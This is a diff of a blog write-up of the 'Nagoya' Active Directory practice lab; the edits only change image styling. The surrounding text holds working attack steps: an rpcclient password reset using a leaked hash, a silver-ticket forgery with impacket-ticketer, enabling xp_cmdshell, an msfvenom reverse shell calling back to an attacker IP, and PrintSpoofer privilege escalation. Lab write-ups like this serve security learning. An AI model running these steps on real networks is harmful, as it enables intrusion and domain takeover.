@@ -67,11 +67,11 @@ PORT      STATE SERVICE           VERSION
 
 There's a few different paths to take here. I actually tried to list smb shares and check rpcclient, but I found nothing, and it often makes sense to get started with the web port anyway, so I go to the browser to check that out. Maybe we can find some creds or usernames to get started in case we need to brute force anything. 
 
-![Nagoya1.png](/assets/images/Nagoya/Nagoya1.png){: .center-aligned width="600px"}
+![Nagoya1.png](/assets/images/Nagoya/Nagoya1.png){: .responsive-image}
 
 We see we have an email with a domain, so we add that to `/etc/hosts` and check around the site. 
 
-![Nagoya2.png](/assets/images/Nagoya/Nagoya2.png){: .center-aligned width="600px"}
+![Nagoya2.png](/assets/images/Nagoya/Nagoya2.png){: .responsive-image}
 
 And there's a page showing a long list of team members in the form of the first and last names. Maybe we need to transform this list into usernames and get started with brute forcing. So I took the list and changed it so that I had these combinations for `First Last`: 
 - `firstlast`
@@ -103,7 +103,7 @@ Sharename       Type      Comment
 
 The first 3 are defaults, and it actually seems as though NETLOGON contains the same files as SYSVOL/scripts, so either way it's a ResetPassword directory which we can download and analyze. 
 
-![Nagoya3.png](/assets/images/Nagoya/Nagoya3.png){: .center-aligned width="600px"}
+![Nagoya3.png](/assets/images/Nagoya/Nagoya3.png){: .responsive-image}
 
 I checked through each of these files but couldn't find anything either by reading them directly or runnings `strings` on them. *Apparently you can run a tool called dnSpy on them, but it appears this is not available for ARM machines.* 
 
@@ -164,7 +164,7 @@ Apparently the key is to check every single user and realize that `christopher.l
 The hash discovered for the `svc_helpdesk` user is `U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`. We'll need to use that to log back into `rpcclient`. Then we'll need to use this command:
 `setuserinfo christopher.lewis 23 'thisb0xsucks!'`. That changes the password, and that allows us to run evil-winrm for code execution. 
 
-![Nagoya4.png](/assets/images/Nagoya/Nagoya4.png){: .center-aligned width="600px"}
+![Nagoya4.png](/assets/images/Nagoya/Nagoya4.png){: .responsive-image}
 
 And that gets us in. Great. I download and run winpeas, and we'll see what else I can find after that. Unfortunately nothing really sticks out from that. I run adPEAS as well, but mostly just to have an easy way to get the Bloodhound zip to my machine. 
 
@@ -172,7 +172,7 @@ Unfortunately that didn't work. I was able to get a bloodhound zip file, but it 
 
 To be honest I found really nothing here. I suppose that this is a Local Privesc situation, and we need to focus on getting Local Admin. Apparently we already have two of the three kerberoastable users. 
 
-![Nagoya5.png](/assets/images/Nagoya/Nagoya5.png){: .center-aligned width="600px"}
+![Nagoya5.png](/assets/images/Nagoya/Nagoya5.png){: .responsive-image}
 
 After a while of looking around, I looked up a writeup again to see the next step, just in case I was blocked by machine for another time with this lab. [I found a writeup](https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f) which introduced two new vectors: Accessin the mssql db from mmy own machine using port forwarding and  impersonating the Administrator account with a silver ticket using the svc_mssql account. 
 
@@ -196,7 +196,7 @@ Then from Kali:
 
 We can then access the mssql instance using this command: `impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth`. 
 
-![Nagoya6.png](/assets/images/Nagoya/Nagoya6.png){: .center-aligned width="600px"}
+![Nagoya6.png](/assets/images/Nagoya/Nagoya6.png){: .responsive-image}
 
 Unfortunately the mssql instance does not seem to have any non-default databases in it, as all four of these are. We can try to use `xp_cmdshell`, but unfortunately our user does not have permission to perform this action. That's where the silver ticket comes in. 
 
@@ -216,7 +216,7 @@ In total the command is: `impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18
 
 Quite the mouthful. Or fingerful... Anyways - we run the command, and we see this: 
 
-![Nagoya7.png](/assets/images/Nagoya/Nagoya7.png){: .center-aligned width="600px"}
+![Nagoya7.png](/assets/images/Nagoya/Nagoya7.png){: .responsive-image}
 
 Success. Now I'm used to doing this from the target machine, but because we're using impacket, we need to make sure that we load the ticket (`Administrator.ccache`) into memory: `export KRB5CCNAME=$PWD/Administrator.ccache`. 
 
@@ -269,7 +269,7 @@ Then we can go back to running `impacket-mssqlclient -k nagoya.nagoya-industries
 4. `RECONFIGURE;`
 5. `EXECUTE xp_cmdshell 'whoami';`
 
-![Nagoya8.png](/assets/images/Nagoya/Nagoya8.png){: .center-aligned width="600px"}
+![Nagoya8.png](/assets/images/Nagoya/Nagoya8.png){: .responsive-image}
 
 And we have code execution. Now we can get another shell with the `svc_mssql` user. We generate a reverse shell with msfvenom, download it from with xp_cmdshell, and execute it with these commands: 
 1. From kali: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.183 LPORT=139 -f exe -o reverse139.exe`
@@ -278,11 +278,11 @@ And we have code execution. Now we can get another shell with the `svc_mssql` us
 
 And we get a shell:
 
-![Nagoya9.png](/assets/images/Nagoya/Nagoya9.png){: .center-aligned width="600px"}
+![Nagoya9.png](/assets/images/Nagoya/Nagoya9.png){: .responsive-image}
 
 An awful lot of work to get another user on the same machine we already had access to, but it's about to pay off, because `svc_mssql` has `SeImpersonatePrivilege`, so we should be able to run a Potato attack gaining full access over the machine. We transfer PrintSpoofer.exe to the target machine and run: `.\PrintSpoofer.exe -i -c cmd`. 
 
-![Nagoya10.png](/assets/images/Nagoya/Nagoya10.png){: .center-aligned width="600px"}
+![Nagoya10.png](/assets/images/Nagoya/Nagoya10.png){: .responsive-image}
 
 And we're finally done with this infuriating box. Really frustrating, but at least I learned a lot. 
 
